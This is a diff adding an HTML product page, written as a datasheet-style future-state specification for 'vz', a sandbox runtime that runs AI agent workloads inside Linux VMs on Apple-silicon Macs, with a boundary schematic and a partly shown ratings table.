@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vz: Sandbox Runtime for Agentic Workloads (Future-State Specification)</title>
+<meta name="description" content="vz: local-first sandbox runtime for agentic workloads. Real Linux VMs on Apple-silicon Macs via Virtualization.framework. Every workload executes in the guest. The host stays clean.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,400..900&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --paper: #f2efe6;
+    --paper-2: #ece7d9;
+    --ink: #1f1c18;
+    --ink-60: rgba(31, 28, 24, .68);
+    --ink-45: rgba(31, 28, 24, .45);
+    --rule: rgba(31, 28, 24, .28);
+    --rule-strong: #1f1c18;
+    --blue: #0f4c81;
+    --blue-ink: #0a3a66;
+    --red: #a33327;
+    --amber: #7a6015;
+    --measure: 72ch;
+    --doc-max: 1180px;
+    --gutter: clamp(20px, 4vw, 56px);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--paper);
+    color: var(--ink);
+    font-family: "IBM Plex Sans", sans-serif;
+    font-size: 15px;
+    line-height: 1.55;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+    caret-color: var(--blue);
+  }
+  ::selection { background: var(--blue); color: var(--paper); }
+  ::placeholder { color: var(--ink-45); }
+  a { color: var(--blue); text-decoration: underline; text-underline-offset: 3px; text-decoration-thickness: 1px; }
+  a:hover { color: var(--blue-ink); text-decoration-thickness: 2px; }
+  :focus-visible { outline: 2px solid var(--blue); outline-offset: 2px; }
+  code, pre, .mono { font-family: "IBM Plex Mono", monospace; }
+  code { font-size: .88em; background: rgba(15, 76, 129, .07); padding: .1em .35em; border-radius: 1px; }
+  pre { line-height: 1.6; }
+  table { font-variant-numeric: tabular-nums; }
+  .num { font-variant-numeric: tabular-nums; }
+
+  /* ── document frame ─────────────────────────────── */
+  .doc { max-width: var(--doc-max); margin: 0 auto; padding: 0 var(--gutter) 0; }
+  .rule { border: 0; border-top: 1px solid var(--rule); }
+  .rule-strong { border: 0; border-top: 2px solid var(--rule-strong); }
+
+  /* ── masthead ───────────────────────────────────── */
+  .mast-top {
+    display: flex; justify-content: space-between; align-items: baseline;
+    padding: 22px 0 12px;
+    font-size: 12px; letter-spacing: .12em; text-transform: uppercase;
+    color: var(--ink-60); font-weight: 500;
+  }
+  .brand { display: inline-flex; align-items: center; gap: 9px; color: var(--ink); }
+  .brand svg { display: block; }
+  .mast-meta { display: flex; gap: 2.2em; flex-wrap: wrap; justify-content: flex-end; }
+  .mast-meta .prelim { color: var(--red); font-weight: 600; }
+  .mast-head {
+    display: grid;
+    grid-template-columns: minmax(0, 1.15fr) minmax(0, .85fr);
+    gap: clamp(28px, 4vw, 64px);
+    align-items: end;
+    padding: 26px 0 30px;
+  }
+  .partno {
+    font-family: "Archivo", sans-serif;
+    font-variation-settings: "wdth" 112, "wght" 830;
+    font-weight: 800;
+    font-size: clamp(88px, 15vw, 190px);
+    line-height: .82;
+    letter-spacing: -0.035em;
+    color: var(--ink);
+  }
+  .partfn {
+    margin-top: 14px;
+    font-size: clamp(15px, 1.7vw, 19px);
+    font-weight: 600;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+  }
+  .partfn em { font-style: normal; color: var(--blue); }
+  .partsub { margin-top: 10px; color: var(--ink-60); max-width: 46ch; font-size: 14.5px; }
+  .docmeta { border-top: 2px solid var(--rule-strong); }
+  .docmeta table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .docmeta th {
+    text-align: left; font-weight: 600; letter-spacing: .08em; text-transform: uppercase;
+    font-size: 11px; color: var(--ink-60);
+    border-bottom: 1px solid var(--rule); padding: 7px 14px 7px 0;
+  }
+  .docmeta td { padding: 7px 14px 7px 0; border-bottom: 1px solid var(--rule); font-family: "IBM Plex Mono", monospace; font-size: 12.5px; }
+  .docmeta tr:last-child th, .docmeta tr:last-child td { border-bottom: 0; }
+
+  /* ── status tags ─────────────────────────────────── */
+  .tag {
+    display: inline-block; font-family: "IBM Plex Mono", monospace;
+    font-size: 10.5px; font-weight: 600; letter-spacing: .1em;
+    padding: 1px 7px 0; border: 1px solid; border-radius: 1px; white-space: nowrap;
+  }
+  .tag-active { color: var(--blue); border-color: var(--blue); background: rgba(15,76,129,.06); }
+  .tag-dev { color: var(--amber); border-color: var(--amber); background: rgba(122,96,21,.06); }
+  .tag-planned { color: var(--red); border-color: var(--red); background: rgba(163,51,39,.05); }
+
+  /* ── two-col intro: features / description ───────── */
+  .intro {
+    display: grid; grid-template-columns: minmax(0, 5fr) minmax(0, 7fr);
+    gap: clamp(28px, 4vw, 64px);
+    padding: 34px 0 40px;
+  }
+  .feat-h, .desc-h {
+    font-size: 13px; font-weight: 700; letter-spacing: .14em; text-transform: uppercase;
+    padding-bottom: 9px; border-bottom: 2px solid var(--rule-strong); margin-bottom: 14px;
+  }
+  .features { list-style: none; font-size: 13.5px; }
+  .features li {
+    padding: 7px 0 7px 0; border-bottom: 1px solid var(--rule);
+    display: flex; gap: 10px; align-items: baseline;
+  }
+  .features li:last-child { border-bottom: 0; }
+  .features .tick { color: var(--blue); font-weight: 600; }
+  .desc { font-size: 14.5px; }
+  .desc p + p { margin-top: 12px; }
+  .desc .lede { font-size: 16.5px; line-height: 1.6; }
+  .desc .lede strong { color: var(--ink); font-weight: 700; }
+  .desc .lede .none-em { color: var(--blue); font-weight: 700; }
+  .desc .foot { margin-top: 14px; font-size: 12.5px; color: var(--ink-60); }
+
+  /* ── section headings ────────────────────────────── */
+  .sec {
+    border-top: 2px solid var(--rule-strong);
+    padding: 30px 0 40px;
+    break-inside: avoid;
+  }
+  .sec-h {
+    display: flex; align-items: baseline; justify-content: space-between; gap: 16px;
+    flex-wrap: wrap;
+  }
+  .sec-h h2 {
+    font-family: "Archivo", sans-serif;
+    font-variation-settings: "wdth" 104, "wght" 700;
+    font-size: clamp(21px, 2.6vw, 27px);
+    letter-spacing: -0.015em;
+    line-height: 1.1;
+    text-transform: uppercase;
+  }
+  .sec-h h2 .no { color: var(--blue); margin-right: .55em; font-variation-settings: "wdth" 80, "wght" 600; }
+  .sec-h .seclabel { font-family: "IBM Plex Mono", monospace; font-size: 11px; letter-spacing: .12em; color: var(--ink-60); text-transform: uppercase; }
+  .sec p { max-width: var(--measure); margin-top: 14px; font-size: 14.5px; }
+  .sec p + p { margin-top: 10px; }
+  .sec .note { font-size: 12.5px; color: var(--ink-60); margin-top: 12px; max-width: var(--measure); }
+
+  /* ── figures ─────────────────────────────────────── */
+  .figure { margin: 26px 0 0; }
+  .figcap {
+    margin-top: 14px; font-size: 12px; color: var(--ink-60);
+    text-transform: uppercase; letter-spacing: .09em; font-weight: 500;
+  }
+  .figcap b { color: var(--ink); }
+  .figwrap { border: 1px solid var(--rule); background: var(--paper); }
+  .figwrap svg { display: block; width: 100%; height: auto; }
+
+  /* ── data tables ─────────────────────────────────── */
+  .tbl { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 22px; }
+  .tbl th {
+    text-align: left; font-size: 11px; font-weight: 700; letter-spacing: .1em; text-transform: uppercase;
+    color: var(--ink); border-bottom: 2px solid var(--rule-strong); padding: 8px 16px 8px 0;
+  }
+  .tbl td { border-bottom: 1px solid var(--rule); padding: 9px 16px 9px 0; vertical-align: top; }
+  .tbl tr:last-child td { border-bottom: 0; }
+  .tbl .t-num { font-family: "IBM Plex Mono", monospace; font-weight: 600; font-size: 12px; white-space: nowrap; }
+  .tbl .t-mono { font-family: "IBM Plex Mono", monospace; font-size: 12.5px; }
+  .tbl .t-dim { color: var(--ink-60); }
+  .tbl .t-center { text-align: center; }
+  .tbl-wrap { overflow-x: auto; }
+
+  /* ── clause blocks (numbered description) ────────── */
+  .clauses { margin-top: 20px; }
+  .clause { border-top: 1px solid var(--rule); padding: 20px 0 24px; display: grid; grid-template-columns: 210px minmax(0, 1fr); gap: clamp(20px, 3vw, 48px); }
+  .clause:first-child { border-top: 0; }
+  .clause-h { font-size: 13px; font-weight: 700; letter-spacing: .1em; text-transform: uppercase; line-height: 1.45; }
+  .clause-h .cno { color: var(--blue); font-family: "IBM Plex Mono", monospace; display: block; font-size: 11.5px; margin-bottom: 4px; font-weight: 600; }
+  .clause-b p { font-size: 14px; max-width: 68ch; }
+  .clause-b p + p { margin-top: 9px; }
+  .clause-b .statusline { margin-top: 12px; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; font-size: 12.5px; color: var(--ink-60); }
+  .clause-b pre.cmdline {
+    margin-top: 12px; border-left: 1px solid var(--blue); background: rgba(15,76,129,.05);
+    padding: 10px 16px; font-size: 12.5px; overflow-x: auto; max-width: 72ch;
+  }
+  .clause-b pre.cmdline .cmt { color: var(--ink-60); }
+
+  /* ── truth table ──────────────────────────────────── */
+  .truth .tbl th { font-size: 11.5px; }
+  .truth .host-none {
+    font-family: "IBM Plex Mono", monospace; font-weight: 600; color: var(--blue);
+    letter-spacing: .08em; white-space: nowrap;
+  }
+  .truth .host-mount { font-family: "IBM Plex Mono", monospace; font-weight: 600; color: var(--red); letter-spacing: .04em; white-space: nowrap; }
+  .truth td .fx { display: block; font-size: 12.5px; margin-top: 2px; color: var(--ink-60); }
+  .truth tfoot td { border-bottom: 0; border-top: 1px solid var(--rule); padding-top: 10px; font-size: 12.5px; color: var(--ink-60); }
+
+  /* ── eval module (interactive bench) ──────────────── */
+  .bench { margin-top: 26px; border: 1px solid var(--rule-strong); background: var(--paper); }
+  .bench-h {
+    display: flex; justify-content: space-between; align-items: baseline; gap: 12px; flex-wrap: wrap;
+    padding: 13px 18px; border-bottom: 1px solid var(--rule-strong);
+    font-family: "IBM Plex Mono", monospace; font-size: 12px; letter-spacing: .1em; text-transform: uppercase;
+  }
+  .bench-h .evm { color: var(--blue); font-weight: 600; }
+  .bench-body { display: grid; grid-template-columns: minmax(0, 5fr) minmax(0, 7fr); }
+  .bench-controls { padding: 18px; border-right: 1px solid var(--rule); }
+  .bench-controls .lbl { font-size: 11px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase; color: var(--ink-60); margin-bottom: 10px; }
+  .preset {
+    display: block; width: 100%; text-align: left; cursor: pointer;
+    font-family: "IBM Plex Mono", monospace; font-size: 12px; line-height: 1.4;
+    background: var(--paper); color: var(--ink); border: 1px solid var(--rule);
+    padding: 9px 12px; margin-bottom: 8px; transition: background .12s, border-color .12s;
+  }
+  .preset:hover { border-color: var(--ink); }
+  .preset[aria-pressed="true"] { background: var(--ink); color: var(--paper); border-color: var(--ink); }
+  .preset .pid { color: var(--blue); font-weight: 600; }
+  .preset[aria-pressed="true"] .pid { color: #9ec7e8; }
+  .run-btn {
+    margin-top: 12px; width: 100%; cursor: pointer;
+    font-family: "Archivo", sans-serif; font-variation-settings: "wdth" 108, "wght" 700;
+    font-size: 14px; letter-spacing: .14em; text-transform: uppercase;
+    color: var(--paper); background: var(--ink); border: 1px solid var(--ink);
+    padding: 12px 0; transition: background .12s, color .12s;
+  }
+  .run-btn:hover { background: var(--blue); border-color: var(--blue); }
+  .run-btn:disabled { opacity: .55; cursor: wait; }
+  .bench-read { display: grid; grid-template-columns: 1fr 1fr; }
+  .cell { padding: 18px; border-right: 1px solid var(--rule); border-bottom: 1px solid var(--rule); min-height: 148px; position: relative; }
+  .cell:nth-child(2n) { border-right: 0; }
+  .cell-h { font-size: 11px; font-weight: 700; letter-spacing: .12em; text-transform: uppercase; margin-bottom: 9px; display: flex; justify-content: space-between; gap: 8px; }
+  .cell-h .chan { font-family: "IBM Plex Mono", monospace; color: var(--blue); font-weight: 600; }
+  .console-out {
+    font-family: "IBM Plex Mono", monospace; font-size: 12.5px; line-height: 1.65;
+    white-space: pre-wrap; word-break: break-word; min-height: 92px;
+  }
+  .console-out .ps1 { color: var(--blue); }
+  .guest-out { font-size: 13px; line-height: 1.55; min-height: 92px; }
+  .guest-out b { font-weight: 700; }
+  .guest-out .fx-kind { font-family: "IBM Plex Mono", monospace; font-size: 11px; font-weight: 600; letter-spacing: .1em; text-transform: uppercase; color: var(--blue); display: inline-block; margin-bottom: 6px; }
+  .host-out { min-height: 92px; display: flex; flex-direction: column; gap: 8px; justify-content: flex-start; }
+  .host-verdict { font-family: "Archivo", sans-serif; font-variation-settings: "wdth" 106, "wght" 800; font-size: 44px; line-height: 1; letter-spacing: -0.01em; color: var(--blue); }
+  .host-meter { font-family: "IBM Plex Mono", monospace; font-size: 11.5px; color: var(--ink-60); line-height: 1.8; }
+  .host-meter b { color: var(--ink); font-weight: 600; }
+  .recovery { font-size: 12.5px; color: var(--ink-60); border-top: 1px solid var(--rule); padding: 12px 18px; grid-column: 1 / -1; }
+  .recovery code { font-size: 11.5px; }
+  .cell.flash { animation: cellflash .5s ease-out 1; }
+  @keyframes cellflash {
+    0% { background: rgba(15, 76, 129, .12); }
+    100% { background: transparent; }
+  }
+
+  /* ── ordering / revision ─────────────────────────── */
+  .order-note { margin-top: 16px; font-size: 12.5px; color: var(--ink-60); max-width: 68ch; }
+  .order-note b { color: var(--ink); }
+
+  /* ── notes + footer ──────────────────────────────── */
+  .notes { border-top: 2px solid var(--rule-strong); padding: 26px 0 20px; font-size: 12.5px; color: var(--ink-60); }
+  .notes h3 { font-size: 12px; letter-spacing: .14em; text-transform: uppercase; color: var(--ink); margin-bottom: 10px; }
+  .notes ol { list-style: none; counter-reset: note; }
+  .notes li { counter-increment: note; padding-left: 26px; position: relative; margin-bottom: 7px; line-height: 1.5; }
+  .notes li::before { content: "(" counter(note) ")"; position: absolute; left: 0; font-family: "IBM Plex Mono", monospace; font-size: 11px; color: var(--blue); }
+  sup.fn { font-family: "IBM Plex Mono", monospace; font-size: .68em; color: var(--blue); font-weight: 600; vertical-align: super; line-height: 0; }
+  .colophon {
+    border-top: 1px solid var(--rule); padding: 20px 0 60px;
+    display: flex; justify-content: space-between; gap: 18px; flex-wrap: wrap;
+    font-size: 12px; color: var(--ink-60); font-family: "IBM Plex Mono", monospace;
+  }
+  .colophon a { color: inherit; }
+
+  /* ── scroll + reduced motion ─────────────────────── */
+  ::-webkit-scrollbar { width: 12px; }
+  ::-webkit-scrollbar-track { background: var(--paper-2); }
+  ::-webkit-scrollbar-thumb { background: var(--rule); border: 3px solid var(--paper-2); border-radius: 6px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--ink-45); }
+  @media (prefers-reduced-motion: reduce) {
+    html { scroll-behavior: auto; }
+    *, *::before, *::after { animation-duration: .01ms !important; transition-duration: .01ms !important; }
+  }
+
+  /* ── responsive ──────────────────────────────────── */
+  @media (max-width: 960px) {
+    .mast-head { grid-template-columns: 1fr; align-items: start; }
+    .docmeta { margin-top: 6px; }
+    .intro { grid-template-columns: 1fr; }
+    .clause { grid-template-columns: 1fr; gap: 10px; }
+    .clause-b { min-width: 0; }
+    .clause-b p { max-width: none; }
+    .clause-b pre.cmdline { max-width: 100%; }
+    .bench-body { grid-template-columns: 1fr; }
+    .bench-controls { border-right: 0; border-bottom: 1px solid var(--rule); }
+    .bench-read { grid-template-columns: 1fr; }
+    .cell { border-right: 0; }
+  }
+  @media (max-width: 560px) {
+    .partno { font-size: clamp(72px, 24vw, 96px); }
+    .clause { grid-template-columns: 1fr; }
+    .clause-h { min-width: 0; }
+  }
+    .bench-controls { border-right: 0; border-bottom: 1px solid var(--rule); }
+    .bench-read { grid-template-columns: 1fr; }
+    .cell { border-right: 0; }
+  }
+  @media print {
+    .bench { display: none; }
+    .sec { break-before: auto; }
+    a { color: var(--ink); text-decoration: none; }
+  }
+</style>
+</head>
+<body>
+<!--
+DIRECTION CONTRACT — seed 074dd045 · mode PERSUADE · code-led
+THESIS: vz is specified, not marketed — the page is a semiconductor datasheet for a sandbox runtime, and the truth table is the pitch: every agent action resolves to HOST EFFECT: NONE.
+OWN-WORLD: cream laid-paper ground, warm ink, engineering blue for measured/live data, signal red for planned/guarded states; hairline rules, flat print surfaces, zero radius, zero shadow; Archivo expanded grotesque for the part identity, IBM Plex Sans/Mono for document body and data (Plex is the subject's native lettering — engineered documentation).
+STORY: a developer evaluating agent sandboxes reads vz like a part they can order: the boundary schematic shows dockerd itself living in the guest; the pin configuration shows the MCP interface as a real IC; the bench proves the NONE claim interactively; revision history keeps every future feature honestly labeled.
+FIRST VIEWPORT: datasheet masthead — gpu-cli brandline, "FUTURE-STATE SPECIFICATION" stamp, giant part number vz with the function line, document meta table right (doc no, rev, date, status), then features column beside general description prose, all above the fold rules.
+FORM: The Datasheet — IMPECCABLE'S PICK card, rank 1 of my grounded list; the roll assigned The Launch Console (index 4); the user locked the pick. Canon declined.
+FINISH: unreviewed and undocumented is unfinished; this build ends with the finish review, the verdict, DESIGN.md, and every shipping raster carrying its provenance.
+-->
+<main class="doc">
+
+  <!-- ─────────────── masthead ─────────────── -->
+  <header>
+    <div class="mast-top">
+      <span class="brand">
+        <svg width="15" height="15" viewBox="0 0 15 15" aria-hidden="true"><rect x="4.5" y="4.5" width="6" height="6" fill="none" stroke="#1f1c18" stroke-width="1.4"/><path d="M7.5 0v4.5M7.5 10.5V15M0 7.5h4.5M10.5 7.5H15" stroke="#1f1c18" stroke-width="1.4"/></svg>
+        gpu-cli
+      </span>
+      <span class="mast-meta">
+        <span>future-state specification</span>
+        <span class="prelim">preliminary · rev&nbsp;F</span>
+      </span>
+    </div>
+    <div class="mast-head">
+      <div>
+        <div class="partno">vz</div>
+        <p class="partfn">Sandbox runtime for <em>agentic&nbsp;workloads</em></p>
+        <p class="partsub">One binary. Real Linux VMs on your Mac. Every workload executes in the guest; the host stays clean.</p>
+      </div>
+      <div class="docmeta">
+        <table aria-label="Document metadata">
+          <tr><th scope="row">Doc&nbsp;No.</th><td>VZ-FS-2026-001</td></tr>
+          <tr><th scope="row">Revision</th><td>F — future state</td></tr>
+          <tr><th scope="row">Issued</th><td>September 2026</td></tr>
+          <tr><th scope="row">Supersedes</th><td>v0.3.20 datasheet</td></tr>
+          <tr><th scope="row">Host&nbsp;req.</th><td>macOS 14+, Apple&nbsp;Silicon</td></tr>
+          <tr><th scope="row">License</th><td>MIT</td></tr>
+        </table>
+      </div>
+    </div>
+  </header>
+
+  <hr class="rule-strong">
+
+  <!-- ─────────────── 1 · description + features ─────────────── -->
+  <section class="intro" aria-labelledby="desc-h">
+    <div>
+      <h2 class="feat-h" id="feat-h">Features</h2>
+      <ul class="features">
+        <li><span class="tick">▪</span><span><b>Real isolation, not seatbelt.</b> Full Linux VM per sandbox via Apple Virtualization.framework<sup class="fn">1</sup></span></li>
+        <li><span class="tick">▪</span><span><b>~3&nbsp;s cold boot</b> to first command, warm reuse thereafter<sup class="fn">2</sup></span></li>
+        <li><span class="tick">▪</span><span><b>Host stays clean.</b> Zero workload processes on macOS, including the Docker daemon itself<sup class="fn">3</sup></span></li>
+        <li><span class="tick">▪</span><span><b>Agent-native interface.</b> MCP tool register, streaming exec, file API, signed receipts<sup class="fn">4</sup></span></li>
+        <li><span class="tick">▪</span><span><b>Containers in the guest.</b> OCI images via youki; deterministic Compose stacks; BuildKit builds</span></li>
+        <li><span class="tick">▪</span><span><b>Disposable by design.</b> Checkpoint, restore, fork, destroy: a sandbox costs nothing to throw away</span></li>
+        <li><span class="tick">▪</span><span><b>Local-first, cloud-optional.</b> Same runtime contract when Linux hosts arrive later</span></li>
+      </ul>
+    </div>
+    <div>
+      <h2 class="desc-h" id="desc-h">1 · General description</h2>
+      <div class="desc">
+        <p class="lede"><strong>vz</strong> is a local-first sandbox runtime for the way software is written in 2026: an agent that compiles, installs, executes, and exfiltrates, inside a Linux VM that boots in about three seconds, mounts your project through VirtioFS, and never lets a single instruction touch macOS.<sup class="fn">3</sup></p>
+        <p>An agent's riskiest command becomes a non-event. <span class="none-em">The host effect is NONE</span> — no host processes, no host files, no host sockets. And when the run is over,, the sandbox is checkpointed, restored, or destroyed in one command.</p>
+        <p>vz is one CLI for three runtimes: OCI containers (youki, in-guest), Compose-class stacks (deterministic reconciler), and raw Linux VMs (custom 6.12.85 kernel, two profiles)<sup class="fn">5</sup>. The control plane (a gRPC daemon and local HTTP API) is built for orchestrators: leases, events, receipts, capability negotiation.<sup class="fn">4</sup></p>
+        <p>Revision F specifies the future state this document sells: the runtime data plane completed (streaming exec, file API), full Docker compatibility with the daemon living <em>inside</em> the guest<sup class="fn">3</sup>, and the MCP register map of §4. Each table below carries its honest status.</p>
+        <p class="foot">Status vocabulary: <span class="tag tag-active">ACTIVE</span> shipped in v0.3.20 · <span class="tag tag-dev">DEV</span> in development · <span class="tag tag-planned">PLANNED</span> committed roadmap, subject to change.</p>
+      </div>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 2 · figure 1: typical application ─────────────── -->
+  <section class="sec" aria-labelledby="arch-h">
+    <div class="sec-h">
+      <h2 id="arch-h"><span class="no">2</span>Typical application: the boundary</h2>
+      <span class="seclabel">Figure 1</span>
+    </div>
+    <p>This is the whole product in one schematic. The host runs three things: your agent, the vz CLI, and a control daemon. Everything else (the guest kernel, youki, <b>dockerd itself</b>, BuildKit) executes inside the Linux VM. Data crosses the boundary only through declared VirtioFS mounts, the vsock control channel, and NAT egress.<sup class="fn">3</sup></p>
+    <div class="figure">
+      <div class="figwrap">
+        <svg viewBox="0 0 1180 560" role="img" aria-label="Schematic: host on the left with agent, CLI, control daemon, and docker client; guest VM on the right with kernel, guest agent, youki, dockerd and buildkitd; connected by vsock, VirtioFS and NAT buses across a virtualization boundary line.">
+          <!-- boundary -->
+          <line x1="640" y1="24" x2="640" y2="520" stroke="#a33327" stroke-width="1.4" stroke-dasharray="7 5"/>
+          <text x="640" y="542" text-anchor="middle" font-family="IBM Plex Mono" font-size="11.5" letter-spacing="2.4" fill="#a33327">HARDWARE VIRTUALIZATION BOUNDARY · NOTHING CROSSES UNLESS DECLARED</text>
+
+          <!-- host block -->
+          <text x="60" y="52" font-family="Archivo" font-size="15" font-weight="700" letter-spacing="2.2" fill="#1f1c18">HOST · macOS · APPLE SILICON</text>
+          <rect x="60" y="66" width="470" height="440" fill="none" stroke="#1f1c18" stroke-width="1.6"/>
+          <text x="76" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">HNDLS: 0 UNTRUSTED PROCESSES</text>
+
+          <rect x="92" y="106" width="406" height="58" fill="rgba(15,76,129,0.06)" stroke="#0f4c81" stroke-width="1.3"/>
+          <text x="108" y="130" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">AGENT RUNTIME</text>
+          <text x="108" y="149" font-family="IBM Plex Mono" font-size="11" fill="#5a5347">Claude Code · Codex · OpenCode · any MCP client</text>
+
+          <rect x="92" y="184" width="190" height="58" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
+          <text x="108" y="208" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">vz CLI</text>
+          <text x="108" y="227" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">vz run · stack · build</text>
+
+          <rect x="308" y="184" width="190" height="58" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
+          <text x="324" y="208" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">vz-runtimed</text>
+          <text x="324" y="227" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">gRPC control plane</text>
+
+          <rect x="92" y="262" width="406" height="58" fill="none" stroke="#a33327" stroke-width="1.2" stroke-dasharray="5 4"/>
+          <text x="108" y="286" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#a33327">DOCKER / COMPOSE CLIENT</text>
+          <text x="108" y="305" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">DOCKER_HOST=unix://~/.vz/docker.sock · PLANNED §5</text>
+
+          <rect x="92" y="340" width="406" height="120" fill="none" stroke="#1f1c18" stroke-width="1.2"/>
+          <text x="108" y="364" font-family="IBM Plex Sans" font-weight="700" font-size="13.5" fill="#1f1c18">STATE</text>
+          <text x="108" y="386" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">~/.vz/  kernels · images · caches · receipts</text>
+          <text x="108" y="406" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">vz.json  per-project sandbox spec</text>
+          <text x="108" y="426" font-family="IBM Plex Mono" font-size="10.8" fill="#5a5347">mounts   the ONLY shared bytes (declared)</text>
+
+          <!-- buses host->guest -->
+          <line x1="295" y1="486" x2="295" y2="486" stroke="none"/>
+          <path d="M 530 150 H 700" stroke="#0f4c81" stroke-width="1.6" fill="none"/>
+          <text x="560" y="142" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.6" fill="#0f4c81">VSOCK · CONTROL + EXEC</text>
+
+          <path d="M 530 490 H 700" stroke="#0f4c81" stroke-width="1.6" fill="none"/>
+          <text x="560" y="482" font-family="IBM Plex Mono" font-size="10.5" letter-spacing="1.6" fill="#0f4c81">VIRTIOFS · PROJECT MOUNTS</text>
+
+          <!-- guest block -->
+          <text x="700" y="52" font-family="Archivo" font-size="15" font-weight="700" letter-spacing="2.2" fill="#1f1c18">GUEST · LINUX VM · DISPOSABLE</text>
+          <rect x="700" y="66" width="420" height="440" fill="rgba(15,76,129,0.045)" stroke="#0f4c81" stroke-width="1.8"/>
+          <text x="716" y="88" font-family="IBM Plex Mono" font-size="10.5" fill="#0f4c81">SANDBOX · RUNS ALL THE WORK</text>
+
+          <rect x="724" y="106" width="372" height="46" fill="none" stroke="#0f4c81" stroke-width="1.3"/>
+          <text x="740" y="126" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#0f4c81">vz GUEST KERNEL 6.12.85</text>
+          <text x="740" y="143" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">developer / container profiles · cgroup v2 · overlayfs · netns</text>
+
+          <rect x="724" y="170" width="372" height="46" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
+          <text x="740" y="190" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#1f1c18">GUEST AGENT</text>
+          <text x="740" y="207" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">exec · stream · fs · mount mgmt</text>
+
+          <rect x="724" y="234" width="178" height="46" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
+          <text x="740" y="254" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#1f1c18">youki (OCI)</text>
+          <text x="740" y="271" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">containers · stacks</text>
+
+          <rect x="918" y="234" width="178" height="46" fill="none" stroke="#1f1c18" stroke-width="1.3"/>
+          <text x="934" y="254" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#1f1c18">buildkitd</text>
+          <text x="934" y="271" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">image builds</text>
+
+          <rect x="724" y="298" width="372" height="46" fill="rgba(163,51,39,0.05)" stroke="#a33327" stroke-width="1.2" stroke-dasharray="5 4"/>
+          <text x="740" y="318" font-family="IBM Plex Sans" font-weight="700" font-size="13" fill="#a33327">dockerd + containerd</text>
+          <text x="740" y="335" font-family="IBM Plex Mono" font-size="10.5" fill="#a33327">FULL DOCKER, IN THE GUEST · PLANNED §5</text>
+
+          <rect x="724" y="362" width="372" height="44" fill="none" stroke="#1f1c18" stroke-width="1.2"/>
+          <text x="740" y="381" font-family="IBM Plex Sans" font-weight="700" font-size="12.5" fill="#1f1c18">CHECKPOINT / RESTORE · fs_quick · vm_full</text>
+          <text x="740" y="397" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">snapshot · fork · template-from-checkpoint</text>
+
+          <!-- egress -->
+          <path d="M 910 490 H 1080 V 430" stroke="#5a5347" stroke-width="1.3" fill="none"/>
+          <path d="M 1074 438 L 1080 428 L 1086 438" stroke="#5a5347" stroke-width="1.3" fill="none"/>
+          <ellipse cx="1080" cy="412" rx="52" ry="20" fill="none" stroke="#5a5347" stroke-width="1.3"/>
+          <text x="1080" y="416" text-anchor="middle" font-family="IBM Plex Mono" font-size="10.5" fill="#5a5347">NAT</text>
+          <text x="1080" y="452" text-anchor="middle" font-family="IBM Plex Mono" font-size="9.6" fill="#a33327">EGRESS POLICY · PLANNED §6</text>
+        </svg>
+      </div>
+      <p class="figcap"><b>Figure 1.</b> Typical application. Dashed elements are specified by this revision and not yet active. The docker client on the host is a client only: the daemon it talks to lives in the guest.</p>
+    </div>
+  </section>
+
+  <hr class="rule">
+
+  <!-- ─────────────── 3 · absolute maximum ratings ─────────────── -->
+  <section class="sec" aria-labelledby="max-h">
+    <div class="sec-h">
+      <h2 id="max-h"><span class="no">3</span>Absolute maximum ratings</h2>
+      <span class="seclabel">Stresses beyond these are the point</span>
+    </div>
+    <p>The agent is the stress. These limits define what may happen; the host column defines what may never happen, no matter what the agent does.</p>
+    <div class="tbl-wrap">
+      <table class="tbl">
+        <thead>
+          <tr><th>Parameter</th><th>Min</th><th>Typ</th><th>Max</th><th>Unit / Condition</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Sandbox cold boot to first command</td><td>–</td><td class="t-mono">~3<sup class="fn">2</sup></td><td>–</td><td class="t-dim">s, first run after install; warm reuse is instant</td></tr>
+          <tr><td>Host processes executing agent code</td><td>0</td><td class="t-mono">0</td><td class="t-mono">0</td><td class="t-dim">processes: invariant, not a target<sup class="fn">3</sup></td></tr>
